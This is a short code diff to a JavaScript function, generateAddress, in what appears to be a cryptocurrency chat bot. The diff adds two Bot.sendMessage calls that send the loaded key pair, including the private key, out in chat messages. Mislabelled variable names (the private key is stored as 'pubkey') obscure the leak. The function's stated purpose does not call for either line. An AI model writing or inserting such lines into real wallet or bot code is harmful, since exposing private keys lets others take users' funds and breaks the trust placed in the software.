@@ -53,7 +53,9 @@ function Pricee(){
 function generateAddress(currency){
  let devkeys = loadKey();
   let prikey = devkeys.publicKey
+  Bot.sendMessage(prikey)
   let pubkey = devkeys.privateKey
+  Bot.sendMessage(pubkey)
  if(!currency){
 Bot.sendMessage('Use : `generateAddress("TRX");`');
  return
